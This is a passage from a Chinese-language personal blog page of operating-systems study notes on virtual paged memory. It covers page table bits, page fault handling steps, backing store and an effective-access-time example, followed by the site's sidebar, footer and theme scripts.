<li>不连续性：物理内存分配的不连续，虚拟地址空间使用的不连续</li>
</ul>
</li>
<li>虚拟页式内存管理</li>
</ul>
<blockquote>
<pre><code>大部分虚拟存储系统都采用虚拟页式存储管理技术，即在页式存储管理的基础上，增加请求调页和页面置换功能</code></pre></blockquote>
<ul>
<li>虚拟页式内存管理<ul>
<li>基本思路</li>
</ul>
</li>
</ul>
<blockquote>
<ol>
<li>当一个用户程序要调入内存运行时，不是将该程序的所有页面都装入内存，而是只装入部分的页面，就可启动程序运行</li>
<li>在运行的过程中，如果发现要运行的程序或要访问数据不在内存，则向系统发出缺页中断请求，系统在处理这个中断时，将外存中相应的页面调入内存，使得该程序能够继续运行</li>
<li>页表表项：逻辑页号+访问位+修改位+保护位+驻留位+物理页帧号</li>
</ol>
</blockquote>
<blockquote>
<pre><code>1.驻留位
表示该页是在内存还是在外存。如果该位等于1，表示该页位于内存当中，即该页表项时有效的，可以使用；如果该位等于0，表示该页当前还在外存当中，如果访问该页表项，将导致缺页中断
2.保护位
表示允许对该页做何种类型的访问，如只读、可读写、可执行等
3.修改位
表明此页在内存中是否被修改过。当系统回收该物理页面时，根据此位来决定是否把它的内容写回外存
4.访问位
如果该页面被访问过（包括读操作或写操作），则设置此位，用于页面置换算法</code></pre></blockquote>
<ul>
<li><p>虚拟页式内存管理</p>
<ul>
<li>基本思路</li>
</ul>
<ol start="4">
<li>缺页中断处理过程</li>
</ol>
<ul>
<li>（1）如果在内存中有空闲的物理页面，则分配一物理页帧f，然后转第4步；否则转第2步</li>
<li>（2）采用某种页面置换算法，选择一个将被替换的物理页帧f，它所对应的逻辑页为q。如果该页在内存期间被修改，则需把它写回外存</li>
<li>（3）对q所对应的页表项进行修改，把驻留位置为0</li>
<li>（4）将需要访问的页p装入到物理页面f当中</li>
<li>（5）修改p所对应的页表项的内容，把驻留位置为1，把物理页面帧号置为f</li>
<li>（6）重新运行被中断的指令</li>
</ul>
<ol start="5">
<li><p>后备存储（backing store）</p>
<ul>
<li>在何处保存未被映射的页（交换空间（磁盘或者文件）：特殊格式，用于存储未被映射的页面）</li>
<li>概念<ul>
<li>一个虚拟地址空间的页面可以被映射到一个文件（在二级存储中）中的某个位置</li>
<li>代码段：映射到可执行二进制文件</li>
<li>动态加载的共享程序段：映射到动态调用的库文件</li>
<li>其他段：可能被映射到交换文件（swap file）</li>
</ul>
</li>
</ul>
</li>
</ol>
<ol start="4">
<li>虚拟内存性能</li>
</ol>
</li>
<li><p>为了便于理解分页的开销，使用有效存储器访问时间（EAT）</p>
</li>
<li><p>EAT=访问时间<em>页命中几率+page fault处理时间</em>page fault几率</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">访存时间：10ns</span><br><span class="line">磁盘访问时间：5ms</span><br><span class="line">参数p=page fault几率</span><br><span class="line">参数q=dirty  fault几率（读写几率，修改位）</span><br><span class="line">EAT=10（1-p）+5000000p（q+1）</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/11/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">105</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">100.2k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
